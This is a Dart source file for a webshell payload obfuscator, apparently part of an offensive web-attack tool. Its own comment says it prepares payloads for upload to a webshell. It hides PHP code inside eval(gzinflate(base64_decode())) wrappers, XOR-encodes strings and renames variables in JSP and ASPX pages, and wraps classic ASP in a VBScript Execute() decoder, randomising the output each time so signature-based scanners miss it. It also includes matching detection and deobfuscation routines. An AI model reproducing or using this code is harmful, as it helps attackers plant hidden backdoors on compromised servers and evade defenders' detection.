import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';

import 'deflate_stub.dart' if (dart.library.io) 'deflate_io.dart';

/// Obfuscates and deobfuscates text payloads before uploading to a webshell.
///
/// Strategy per language:
///   PHP  → eval(gzinflate(base64_decode('...')))  + random nonce comment
///   JSP  → rename local vars to single letters + XOR-encode string literals
///   ASPX → rename local vars to single letters + XOR-encode string literals
///   ASP  → VBScript Execute() with XOR hex-encoded inner code
///
/// Each call produces a different output (random XOR key + nonce).
class PayloadObfuscator {
  // ── PHP detection ─────────────────────────────────────────────────────────
  static final _phpGzipRe = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );
  static final _phpB64Re = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );

  // ── JSP detection ─────────────────────────────────────────────────────────
  static final _jspHelperRe = RegExp(
    r'<%!private static String _d\(int\[\]',
    caseSensitive: true,
  );
  static final _jspCallRe = RegExp(r'_d\(new int\[\]\{([0-9,]*)\},(\d+)\)');

  // ── ASPX detection ────────────────────────────────────────────────────────
  static final _aspxHelperRe = RegExp(
    r'<script runat="server">.*?static string _D\(int\[\]',
    dotAll: true,
    caseSensitive: true,
  );
  static final _aspxCallRe = RegExp(r'_D\(new int\[\]\{([0-9,]*)\},(\d+)\)');

  // ── ASP detection ─────────────────────────────────────────────────────────
  static final _aspWrapperRe = RegExp(
    r'Execute _d\("([0-9a-f]+)",(\d+)\)',
    caseSensitive: true,
  );

  // ── Scriptlet regex (JSP + ASPX) ──────────────────────────────────────────
  static final _scriptletRe = RegExp(r'<%(!)?(?![=@])(.*?)%>', dotAll: true);

  // ── Java/JSP keywords — never rename ─────────────────────────────────────
  static const _javaKeywords = <String>{
    'abstract', 'assert', 'boolean', 'break', 'byte', 'case', 'catch', 'char',
    'class', 'const', 'continue', 'default', 'do', 'double', 'else', 'enum',
    'extends', 'final', 'finally', 'float', 'for', 'goto', 'if', 'implements',
    'import', 'instanceof', 'int', 'interface', 'long', 'native', 'new',
    'package', 'private', 'protected', 'public', 'return', 'short', 'static',
    'strictfp', 'super', 'switch', 'synchronized', 'this', 'throw', 'throws',
    'transient', 'try', 'void', 'volatile', 'while', 'true', 'false', 'null',
    // JSP implicit objects
    'request', 'response', 'out', 'session', 'application', 'config',
    'pageContext', 'page', 'exception',
  };

  // ── C#/ASPX keywords — never rename ──────────────────────────────────────
  static const _csKeywords = <String>{
    'abstract', 'as', 'base', 'bool', 'break', 'byte', 'case', 'catch', 'char',
    'checked', 'class', 'const', 'continue', 'decimal', 'default', 'delegate',
    'do', 'double', 'else', 'enum', 'event', 'explicit', 'extern', 'false',
    'finally', 'fixed', 'float', 'for', 'foreach', 'goto', 'if', 'implicit',
    'in', 'int', 'interface', 'internal', 'is', 'lock', 'long', 'namespace',
    'new', 'null', 'object', 'operator', 'out', 'override', 'params', 'private',
    'protected', 'public', 'readonly', 'ref', 'return', 'sbyte', 'sealed',
    'short', 'sizeof', 'stackalloc', 'static', 'string', 'struct', 'switch',
    'this', 'throw', 'true', 'try', 'typeof', 'uint', 'ulong', 'unchecked',
    'unsafe', 'ushort', 'using', 'virtual', 'void', 'volatile', 'while', 'var',
    // ASPX implicit objects
    'Request', 'Response', 'Server', 'Session', 'Application', 'Context', 'Page',
  };

  // ── Public API ────────────────────────────────────────────────────────────

  static bool supportsType(String type) =>
      type == 'php' || type == 'jsp' || type == 'asp' || type == 'aspx';

  static bool isObfuscated(String content) {
    final t = content.trim();
    return _phpGzipRe.hasMatch(t) ||
        _phpB64Re.hasMatch(t) ||
        _jspHelperRe.hasMatch(t) ||
        _aspxHelperRe.hasMatch(t) ||
        _aspWrapperRe.hasMatch(t);
  }

  static String? obfuscate(String content, String type) {
    switch (type) {
      case 'php':  return _obfuscatePhp(content);
      case 'jsp':  return _obfuscateJsp(content);
      case 'aspx': return _obfuscateAspx(content);
      case 'asp':  return _obfuscateAsp(content);
      default:     return null;
    }
  }

  static String? tryDeobfuscate(String content) {
    final t = content.trim();
    return _deobfuscatePhp(t) ??
        _deobfuscateJsp(t) ??
        _deobfuscateAspx(t) ??
        _deobfuscateAsp(t);
  }

  static Uint8List? obfuscateBytes(Uint8List bytes, String type) {
    try {
      final out = obfuscate(utf8.decode(bytes), type);
      if (out == null) return null;
      return Uint8List.fromList(utf8.encode(out));
    } catch (_) {
      return null;
    }
  }

  static String typeFromFileName(String name) {
    final ext = name.contains('.') ? name.split('.').last.toLowerCase() : '';
    switch (ext) {
      case 'php':             return 'php';
      case 'jsp': case 'jspx': return 'jsp';
      case 'aspx':            return 'aspx';
      case 'asp':             return 'asp';
      default:                return 'other';
    }
  }

  // ── PHP ───────────────────────────────────────────────────────────────────

  // PHP superglobals and special vars — never rename
  static const _phpSuperGlobals = <String>{
    '_GET', '_POST', '_REQUEST', '_SERVER', '_FILES', '_COOKIE',
    '_SESSION', '_ENV', '_GLOBALS', 'GLOBALS', 'this',
  };

  static String _obfuscatePhp(String content) {
    var code = content.trim();
    if (code.startsWith('<?php')) {
      code = code.substring(5);
    } else if (code.startsWith('<?')) {
      code = code.substring(2);
    }
    if (code.endsWith('?>')) code = code.substring(0, code.length - 2);
    code = code.trim();
    // Rename user-defined variables to single letters
    final renameMap = _buildPhpRenameMap(code);
    if (renameMap.isNotEmpty) code = _applyPhpRenameMap(code, renameMap);
    // Random nonce ensures different gzip output on every call
    final nonce = _rnd.nextInt(0xFFFFFF).toRadixString(16).padLeft(6, '0');
    code = '/*$nonce*/$code';
    final bytes = utf8.encode(code);
    if (supportsDeflate) {
      return "<?php @eval(gzinflate(base64_decode('${base64Encode(rawDeflate(bytes))}')));?>";
    }
    return "<?php @eval(base64_decode('${base64Encode(bytes)}'));?>";
  }

  /// Collect all user-defined PHP variable names (≥ 2 chars, not superglobals).
  static Map<String, String> _buildPhpRenameMap(String code) {
    final declared = <String>{};
    // Match $varName but not $$varName (variable variables)
    final varRe = RegExp(r'(?<!\$)\$([a-zA-Z_][a-zA-Z0-9_]+)');
    for (final m in varRe.allMatches(code)) {
      final name = m.group(1)!;
      if (!_phpSuperGlobals.contains(name)) declared.add(name);
    }
    final map = <String, String>{};
    var idx = 0;
    for (final n in declared) {
      map[n] = _shortName(idx++);
    }
    return map;
  }

  static String _applyPhpRenameMap(String code, Map<String, String> map) {
    var result = code;
    for (final entry in map.entries) {
      result = result.replaceAllMapped(
        RegExp(r'(?<!\$)\$' + RegExp.escape(entry.key) + r'\b'),
        (_) => '\$${entry.value}',
      );
    }
    return result;
  }

  static String? _deobfuscatePhp(String t) {
    final gzM = _phpGzipRe.firstMatch(t);
    if (gzM != null) {
      try {
        var decoded = utf8.decode(rawInflate(base64Decode(gzM.group(1)!)));
        decoded = decoded.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
        return '<?php\n$decoded\n?>';
      } catch (_) {}
    }
    final b64M = _phpB64Re.firstMatch(t);
    if (b64M != null) {
      try {
        var decoded = utf8.decode(base64Decode(b64M.group(1)!));
        decoded = decoded.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
        return '<?php\n$decoded\n?>';
      } catch (_) {}
    }
    return null;
  }

  // ── JSP ───────────────────────────────────────────────────────────────────
  //
  // 1. Rename local variables to single letters (a, b, c …)
  // 2. XOR-encode all Java string literals; inject _d() decode helper

  static const _jspHelperDecl =
      '<%!private static String _d(int[]c,int k)'
      '{StringBuilder r=new StringBuilder();'
      'for(int x:c)r.append((char)(x^k));return r.toString();}%>';

  static String _obfuscateJsp(String content) {
    final key = _rndKey();
    final allBodies = _scriptletRe.allMatches(content)
        .map((m) => m.group(2)!)
        .join('\n');
    final renameMap = _buildRenameMap(allBodies, _javaKeywords);
    final processed = _processScriptlets(
      content, key, renameMap,
      (ints, k) => '_d(new int[]{${ints.join(",")}},$k)',
    );
    return _oneLiner('$_jspHelperDecl$processed');
  }

  static String? _deobfuscateJsp(String t) {
    if (!_jspHelperRe.hasMatch(t)) return null;
    var out = t.replaceAll(
      RegExp(
        r'<%!private static String _d\(int\[\]c,int k\)\{.*?\}%>\n?',
        dotAll: true,
      ),
      '',
    );
    out = out.replaceAllMapped(_jspCallRe, (m) {
      try {
        final ints =
            m.group(1)!.split(',').where((s) => s.isNotEmpty).map(int.parse);
        final key = int.parse(m.group(2)!);
        return '"${_escapeJava(String.fromCharCodes(ints.map((c) => c ^ key)))}"';
      } catch (_) {
        return m.group(0)!;
      }
    });
    return out.trim();
  }

  // ── ASPX ──────────────────────────────────────────────────────────────────

  static const _aspxHelperScript =
      '<script runat="server">'
      'static string _D(int[]c,int k){'
      'var r=new System.Text.StringBuilder();'
      'foreach(var x in c)r.Append((char)(x^k));'
      'return r.ToString();}'
      '</script>';

  static String _obfuscateAspx(String content) {
    final key = _rndKey();
    final allBodies = _scriptletRe.allMatches(content)
        .map((m) => m.group(2)!)
        .join('\n');
    final renameMap = _buildRenameMap(allBodies, _csKeywords);
    final processed = _processScriptlets(
      content, key, renameMap,
      (ints, k) => '_D(new int[]{${ints.join(",")}},$k)',
    );
    final end = _lastDirectiveEnd(processed);
    final merged = '${processed.substring(0, end)}$_aspxHelperScript'
        '${processed.substring(end)}';
    return _oneLiner(merged);
  }

  static String? _deobfuscateAspx(String t) {
    if (!_aspxHelperRe.hasMatch(t)) return null;
    var out = t.replaceAll(
      RegExp(
        r'<script runat="server">static string _D\(int\[\]c.*?</script>',
        dotAll: true,
      ),
      '',
    );
    out = out.replaceAllMapped(_aspxCallRe, (m) {
      try {
        final ints =
            m.group(1)!.split(',').where((s) => s.isNotEmpty).map(int.parse);
        final key = int.parse(m.group(2)!);
        return '"${_escapeCSharp(String.fromCharCodes(ints.map((c) => c ^ key)))}"';
      } catch (_) {
        return m.group(0)!;
      }
    });
    return out.trim();
  }

  // ── ASP (classic VBScript) ────────────────────────────────────────────────

  static String _obfuscateAsp(String content) {
    var code = content.trim();
    code = code.replaceAll(RegExp(r'<%@[^%]*%>\s*'), '');
    if (code.startsWith('<%')) code = code.substring(2);
    if (code.endsWith('%>')) code = code.substring(0, code.length - 2);
    code = code.trim();
    final key = _rndKey();
    final hex = code.runes
        .map((c) => (c ^ key).toRadixString(16).padLeft(4, '0'))
        .join();
    return '<%@ Language="VBScript" %>'
        '<%Function _d(h,k):Dim r,i:r="":For i=1 To Len(h) Step 4:'
        'r=r&Chr(CLng("&H"&Mid(h,i,4)) Xor k):Next:_d=r:End Function:'
        'Execute _d("$hex",$key)%>';
  }

  static String? _deobfuscateAsp(String t) {
    final m = _aspWrapperRe.firstMatch(t);
    if (m == null) return null;
    try {
      final hex = m.group(1)!;
      final key = int.parse(m.group(2)!);
      final sb = StringBuffer('<%@ Language="VBScript" %>\n<%\n');
      for (var i = 0; i < hex.length; i += 4) {
        sb.writeCharCode(int.parse(hex.substring(i, i + 4), radix: 16) ^ key);
      }
      sb.write('\n%>');
      return sb.toString();
    } catch (_) {
      return null;
    }
  }

  // ── Variable renaming ─────────────────────────────────────────────────────

  /// Scan [code] for local variable declarations and map each name to a
  /// single-letter name (a, b, … z, aa, ab, …).
  ///
  /// Detection pattern: `TypeName varName` where TypeName is either a
  /// capitalised class name or a primitive/var keyword, and varName is
  /// lower-camel with ≥ 2 chars (single-letter loop vars are already short).
  static Map<String, String> _buildRenameMap(
      String code, Set<String> keywords) {
    final declared = <String>{};
    final declRe = RegExp(
      r'\b(?:[A-Z][a-zA-Z0-9_]*(?:\s*\[\])?|'
      r'(?:byte|short|int|long|float|double|boolean|char|bool|var|string|object)'
      r'(?:\s*\[\])?)'
      r'\s+([a-z][a-zA-Z0-9_]+)\s*(?=[=;:,\)\{])',
    );
    for (final m in declRe.allMatches(code)) {
      final name = m.group(1)!;
      if (!keywords.contains(name)) declared.add(name);
    }
    final map = <String, String>{};
    var idx = 0;
    for (final n in declared) {
      map[n] = _shortName(idx++);
    }
    return map;
  }

  /// Generates: a … z, aa, ab … az, ba …
  static String _shortName(int i) {
    if (i < 26) return String.fromCharCode(0x61 + i);
    final hi = i ~/ 26 - 1;
    final lo = i % 26;
    return '${String.fromCharCode(0x61 + hi)}${String.fromCharCode(0x61 + lo)}';
  }

  static String _applyRenameMap(String code, Map<String, String> map) {
    var result = code;
    for (final entry in map.entries) {
      result = result.replaceAllMapped(
        RegExp(r'\b' + RegExp.escape(entry.key) + r'\b'),
        (_) => entry.value,
      );
    }
    return result;
  }

  // ── Shared helpers ────────────────────────────────────────────────────────

  /// Apply variable rename + string literal encoding to every scriptlet block.
  static String _processScriptlets(
    String src,
    int key,
    Map<String, String> renameMap,
    String Function(List<int>, int) callTemplate,
  ) {
    final result = StringBuffer();
    var pos = 0;
    for (final match in _scriptletRe.allMatches(src)) {
      result.write(src.substring(pos, match.start));
      final isDecl = match.group(1) != null;
      var body = match.group(2)!;
      if (renameMap.isNotEmpty) body = _applyRenameMap(body, renameMap);
      body = _encodeStringLiterals(body, key, callTemplate);
      result.write(isDecl ? '<%!' : '<%');
      result.write(body);
      result.write('%>');
      pos = match.end;
    }
    result.write(src.substring(pos));
    return result.toString();
  }

  /// Replace `"..."` string literals with XOR-encoded call expressions.
  /// Skips `//` line comments and `/* */` block comments.
  static String _encodeStringLiterals(
    String code,
    int key,
    String Function(List<int>, int) callTemplate,
  ) {
    final out = StringBuffer();
    var i = 0;
    while (i < code.length) {
      if (i + 1 < code.length && code[i] == '/' && code[i + 1] == '/') {
        final nl = code.indexOf('\n', i);
        final end = nl == -1 ? code.length : nl + 1;
        out.write(code.substring(i, end));
        i = end;
        continue;
      }
      if (i + 1 < code.length && code[i] == '/' && code[i + 1] == '*') {
        final end = code.indexOf('*/', i + 2);
        final close = end == -1 ? code.length : end + 2;
        out.write(code.substring(i, close));
        i = close;
        continue;
      }
      if (code[i] == '"') {
        final strEnd = _findStringEnd(code, i + 1);
        if (strEnd != -1) {
          final inner = code.substring(i + 1, strEnd);
          final decoded = _unescapeJava(inner);
          final ints = decoded.runes.map((c) => c ^ key).toList();
          out.write(callTemplate(ints, key));
          i = strEnd + 1;
          continue;
        }
      }
      out.write(code[i]);
      i++;
    }
    return out.toString();
  }

  static int _findStringEnd(String s, int start) {
    var i = start;
    while (i < s.length) {
      if (s[i] == '\\') {
        i += 2;
        continue;
      }
      if (s[i] == '"') return i;
      i++;
    }
    return -1;
  }

  static String _unescapeJava(String s) => s
      .replaceAll(r'\"', '"')
      .replaceAll(r'\\', '\\')
      .replaceAll(r'\n', '\n')
      .replaceAll(r'\r', '\r')
      .replaceAll(r'\t', '\t');

  static String _escapeJava(String s) => s
      .replaceAll('\\', r'\\')
      .replaceAll('"', r'\"')
      .replaceAll('\n', r'\n')
      .replaceAll('\r', r'\r')
      .replaceAll('\t', r'\t');

  static String _escapeCSharp(String s) => _escapeJava(s);

  static int _lastDirectiveEnd(String src) {
    final re = RegExp(r'<%@[^%]*%>');
    int end = 0;
    for (final m in re.allMatches(src)) {
      if (m.end > end) end = m.end;
    }
    return end;
  }

  static String _oneLiner(String s) =>
      s.replaceAll('\r\n', '').replaceAll('\r', '').replaceAll('\n', '');

  static final _rnd = Random.secure();
  static int _rndKey() => _rnd.nextInt(180) + 20;
}
